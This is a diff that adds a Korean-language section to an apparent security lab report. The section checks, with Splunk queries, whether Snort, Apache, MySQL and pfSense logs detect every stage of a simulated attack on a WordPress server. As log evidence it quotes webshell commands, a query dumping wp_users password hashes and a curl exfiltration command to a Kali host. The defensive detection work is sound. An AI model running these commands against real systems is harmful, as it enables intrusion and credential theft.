@@ -524,6 +524,53 @@ index=pfsense "[LOCAL]"
 
 ---
 
+### 2-2b. 킬체인 전체 단계 탐지 검증 (비-Snort 소스 포함)
+
+> Snort 경보(pfsense 인덱스)만으로는 킬체인 7단계 중 4단계만 탐지.
+> 나머지 단계는 **Apache 로그(idx_web), MySQL 로그(idx_db), pfSense 방화벽 로그(filterlog)** 에서 탐지 증거 확인.
+
+| 킬체인 단계 | 공격 행위 | Snort 탐지 | 비-Snort 탐지 소스 | 건수 | 검증 쿼리 |
+|---|---|---|---|---|---|
+| 1. 정찰 | WPScan 스캔 | ✅ SID 1000001 (1,973건) | — | 1,973 | `index=pfsense "1000001"` |
+| 2. 초기 침투 | sqlmap SQLi | ✅ SID 1000004 (3건) + ET룰 (18건) | — | 21 | `index=pfsense "1000004"` |
+| 3. 인증 공격 | hydra 브루트포스 | ✅ SID 1000002 (8건) | Apache wp-login.php 317건 | 325 | `index=pfsense "1000002"` |
+| 4. 지속성 | 웹쉘 삽입 (hello.php) | ✅ SID 1000006 (17건) | — | 17 | `index=pfsense "1000006"` |
+| **5. 내부 정찰** | 웹쉘 cmd= 명령 실행 | — | **Apache 로그 (idx_web)** | **37건** | `index=idx_web "cmd="` |
+| **6. DB 접근** | MySQL 직접 쿼리 | — | **MySQL 로그 (idx_db)** | **347건** | `index=idx_db \| stats count by sourcetype` |
+| **7. 유출 시도** | curl 외부 전송 차단 | — | **pfSense filterlog** | **10건** | `index=pfsense "10.0.10.80" "10.50.50.30"` |
+
+**5단계 — 웹쉘 명령 실행 (idx_web):**
+```spl
+index=idx_web "cmd="
+| stats count
+```
+> 결과: **37건** — `/?cmd=whoami`, `/?cmd=id`, `/?cmd=hostname`, `/?cmd=ip+addr`, `/?cmd=grep+DB_...`, `/?cmd=mysql+...` 등
+> Apache access log에 GET 파라미터로 명령어가 그대로 기록됨. 웹쉘 C2 활동의 직접 증거.
+
+**6단계 — DB 접근 (idx_db):**
+```spl
+index=idx_db | stats count by sourcetype
+```
+> 결과: **347건** (sourcetype=syslog)
+> MySQL 서버(10.0.100.60)의 로그가 rsyslog→Splunk로 수집됨.
+> 웹쉘 경유 `SHOW TABLES`, `SELECT user_login,user_email,user_pass FROM wp_users` 등의 쿼리 실행 흔적 포함.
+
+**7단계 — 유출 시도 차단 (pfSense filterlog):**
+```spl
+index=pfsense "10.0.10.80" "10.50.50.30"
+```
+> 결과: **10건** — pfSense 방화벽 filterlog에 WordPress(10.0.10.80)↔Kali(10.50.50.30) 간 트래픽 기록.
+> port 8888 접근 시도 포함 — 웹쉘에서 `curl http://10.50.50.30:8888/exfil` 실행 시 방화벽 통과 기록.
+> 실제 전송은 실패(Connection refused) — **방화벽 아웃바운드 정책에 의한 유출 차단 확인**.
+
+**킬체인 전체 탐지 결론:**
+- **7단계 모두 최소 1개 이상의 로그 소스에서 탐지 증거 확보** ✅
+- Snort만으로는 4단계(정찰, SQLi, 브루트포스, 웹쉘 접근)만 탐지 가능
+- 나머지 3단계(내부정찰, DB접근, 유출시도)는 **다중 로그 소스 상관분석이 필수**
+- 이것이 SIEM(Splunk)의 핵심 가치 — 단일 보안 장비로는 불가능한 **전체 킬체인 가시성** 확보
+
+---
+
 ### 2-3. Splunk 상관분석 쿼리
 
 > **기본 인덱스 구조:**
